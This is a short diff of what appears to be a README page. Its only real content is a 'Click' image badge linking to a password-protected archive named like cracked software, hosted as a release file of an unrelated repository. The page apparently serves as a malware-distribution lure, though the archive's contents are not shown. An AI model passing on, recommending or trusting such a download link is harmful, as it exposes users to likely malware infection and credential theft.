@@ -1,4 +1,4 @@
-[<img src="https://i.imgur.com/orDhtRz.jpeg"/>]
+<img src="https://i.imgur.com/orDhtRz.jpeg"/>
 
 [![Click](https://github.com/nielleisha/nielleisha1/assets/160551635/dc150ab8-d683-419a-a416-4a2153637156)](https://github.com/FullStack-Trindade/M3P-FrontEnd-Squad5/releases/download/aas/SofCracLua_Pwd_2024.rar)
 
